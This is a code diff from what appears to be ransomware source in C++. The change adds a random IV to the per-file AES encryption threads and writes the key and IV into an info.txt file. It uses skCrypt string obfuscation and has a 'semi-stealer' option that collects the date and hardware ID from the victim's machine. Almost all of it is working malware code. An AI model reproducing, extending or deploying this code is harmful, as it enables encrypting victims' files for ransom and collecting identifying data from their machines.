@@ -82,12 +82,14 @@ int main(int argc, char* argv[]) {
             threads[i].join();
     }
 
-    // generate key
+    // generate key & iv
     string key = aes_encrypt(KEYOFKEY, GenerateRandom(32), IV);
+    Sleep(rand() % 500 + 1);
+    string iv = aes_encrypt(KEYOFKEY, GenerateRandom(16), IV);
 
     // open all threads that encrypt files
     for (int i = 0; i < filesSplitted.size(); i++)
-        threads[i] = thread(EncryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV));
+        threads[i] = thread(EncryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV), aes_decrypt(KEYOFKEY, iv, IV));
 
 
     // generate infoFile content
@@ -95,7 +97,7 @@ int main(int argc, char* argv[]) {
 
     // info.txt content
     string info_txt = (string)skCrypt("");
-    info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\\") + iv + (string)skCrypt("\n");
     if (STEAL_INFO) { // semi-stealer
         info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
         info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
